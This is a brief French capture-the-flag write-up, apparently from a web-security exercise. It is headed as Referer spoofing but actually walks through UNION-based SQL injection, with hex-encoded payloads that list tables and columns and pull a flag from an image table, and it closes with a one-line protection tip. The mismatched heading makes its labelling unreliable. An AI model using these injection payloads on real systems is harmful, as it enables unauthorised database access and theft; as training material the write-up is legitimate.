# Vulnérabilité de Referer Spoofing (Falsification de Referer)

## Découverte

On voit que l'on doit recuperer le flag dans les images

Print toute les tables pour trouver la table des images
```
1 UNION SELECT table_name, NULL FROM information_schema.tables -- 
```

Checker toute les columns de la table list_images

```
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x6C6973745F696D61676573 --
```
la table contient les column :

    - id
    - url
    - title
    - comment

On teste les sortie, je mets ca dans image numbers 

```
1 UNION SELECT url, comment FROM list_images WHERE url=0x626f726e746f7365632e64646e732e6e65742f696d616765732e706e67 --
```
et ca sort le flag albatroz dechffre en MD5 et si on l'encrypte en sha256 on obtient le flag


## Protection
Il faut verifier si il n'y a pas e SQL dans les requetes si on les inseres apres dans les requetes sql 
